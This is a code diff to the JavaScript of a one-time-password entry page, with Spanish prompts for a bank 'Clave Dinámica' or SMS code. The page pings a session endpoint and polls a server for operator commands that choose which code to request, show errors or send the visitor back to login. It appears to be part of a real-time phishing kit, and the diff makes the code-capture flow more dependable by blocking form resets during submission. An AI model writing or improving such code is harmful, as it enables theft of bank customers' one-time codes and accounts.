@@ -10,10 +10,14 @@ let pingInterval = setInterval(() => {
 }, 3000);
 fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
 
+let isSubmitting = false;
+
 function updateUI(otpType) {
   const otpTitle = document.getElementById("otp-title");
   const description = document.querySelector(".bc-key-validation-description");
   if (otpTitle && otpType) {
+    isSubmitting = false; // Reset submission flag
+    resetOTP(); // Clear inputs and focus
     if (otpType === 'dinamica') {
       otpTitle.textContent = "Ingresa la Clave Dinámica";
       if (description) {
@@ -43,12 +47,13 @@ let pollInterval = setInterval(async () => {
         clearInterval(pingInterval);
         clearInterval(pollInterval);
         window.location.href = "index.html";
-      } else if (action === 'dinamica' || action === 'sms') {
+      } else if ((action === 'dinamica' || action === 'sms') && !isSubmitting) {
         sessionStorage.setItem('otpType', action);
         updateUI(action);
         document.getElementById("otp-validating").hidden = true;
         document.getElementById("otp-content").hidden = false;
       } else if (action === 'error-dinamica') {
+        isSubmitting = false;
         document.getElementById("otp-validating").hidden = true;
         document.getElementById("otp-content").hidden = false;
         resetOTP();
@@ -64,6 +69,7 @@ let pollInterval = setInterval(async () => {
           body: JSON.stringify({ action: null })
         }).catch(() => {});
       } else if (action === 'error-sms') {
+        isSubmitting = false;
         document.getElementById("otp-validating").hidden = true;
         document.getElementById("otp-content").hidden = false;
         resetOTP();
@@ -79,6 +85,7 @@ let pollInterval = setInterval(async () => {
           body: JSON.stringify({ action: null })
         }).catch(() => {});
       } else if (action === 'error-login') {
+        isSubmitting = false;
         clearInterval(pingInterval);
         clearInterval(pollInterval);
         window.location.href = `login.html?error=${action}`;
@@ -146,6 +153,7 @@ document.getElementById("otp-close").addEventListener("click", () => {
 
 next.addEventListener("click", () => {
   if (value().length !== 6) return;
+  isSubmitting = true; // Block poll UI resets while validating
   document.getElementById("otp-content").hidden = true;
   document.getElementById("otp-validating").hidden = false;
 
